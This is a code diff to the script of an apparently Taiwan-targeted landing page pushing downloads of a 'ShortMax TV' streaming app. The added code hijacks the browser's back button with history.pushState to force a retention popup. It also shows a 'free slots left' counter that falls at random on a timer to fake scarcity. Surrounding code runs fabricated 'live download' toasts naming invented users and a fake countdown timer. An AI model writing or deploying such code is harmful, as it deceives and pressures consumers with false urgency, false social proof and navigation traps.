+      // 同步展示安全指引彈窗
+      document.getElementById('downloadModal').style.display = 'flex';
     }
 
     function closeModal(e) {
@@ -1471,7 +1556,45 @@
       document.getElementById('downloadModal').style.display = 'none';
     }
 
-    // 條款 Modal 系統
+    /* 退出挽留邏輯 (Exit Intent) */
+    function initExitIntent() {
+      history.pushState({ page: 'home' }, '', '');
+      window.addEventListener('popstate', function (e) {
+        const retainModal = document.getElementById('retainModal');
+        if (retainModal && retainModal.dataset.shown !== 'true') {
+          retainModal.style.display = 'flex';
+          retainModal.dataset.shown = 'true';
+          history.pushState({ page: 'retained' }, '', '');
+        }
+      });
+    }
+
+    function closeRetainModal(e) {
+      document.getElementById('retainModal').style.display = 'none';
+    }
+    function closeRetainModalDirect() {
+      document.getElementById('retainModal').style.display = 'none';
+    }
+    function confirmRetainDownload() {
+      document.getElementById('retainModal').style.display = 'none';
+      triggerDownload('離開挽留彈窗確認');
+    }
+
+    /* 名額自然遞減邏輯 */
+    let currentSlots = 87;
+    function startSlotsReduction() {
+      setInterval(() => {
+        if (currentSlots > 12) {
+          currentSlots -= Math.floor(Math.random() * 2) + 1;
+          const slotsElem = document.getElementById('urgentSlotsText');
+          if (slotsElem) {
+            slotsElem.innerHTML = `🔥 台灣限時：今日剩餘 <strong>${currentSlots}</strong> 位免費啟用【台港高速 4K 追劇專線】`;
+          }
+        }
+      }, 7000);
+    }
+
+    /* 條款 Modal 系統 */
     const POLICY_CONTENT = {
       privacy: {
         title: "ShortMax TV 隱私權保護政策",
@@ -1529,7 +1652,7 @@
       document.getElementById('policyModal').style.display = 'none';
     }
 
-    // 實時下載動態彈幕
+    /* 實時下載動態彈幕 */
     const LIVE_TOAST_MESSAGES = [
       "台北市信義區的 吳** 剛剛下載了 ShortMax TV",
       "台中市西屯區的 曾** 緩存了《百萬人推理》全集",
@@ -1555,7 +1678,7 @@
       toastIndex++;
     }
 
-    // 15 分鐘名額倒計時器
+    /* 15 分鐘倒數計時 */
     function startCountdown() {
       let duration = 14 * 60 + 59;
       const display = document.getElementById('headerTimer');
@@ -1569,7 +1692,7 @@
       }, 1000);
     }
 
-    // 檢測是否處於 Facebook / Instagram 內嵌瀏覽器
+    /* 檢查 App 內嵌環境並切換頂部狀態 */
     function checkInAppBrowser() {
       const ua = navigator.userAgent || navigator.vendor || window.opera;
       const isFB = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1);
@@ -1578,12 +1701,14 @@
       }
     }
 
-    // 頁面初始化
+    /* 頁面初始化 */
     window.addEventListener('DOMContentLoaded', () => {
       renderCards('all');
       renderReviews();
       startCountdown();
+      startSlotsReduction();
       checkInAppBrowser();
+      initExitIntent();
 
       setInterval(showLiveToast, 4800);
       setTimeout(showLiveToast, 1200);
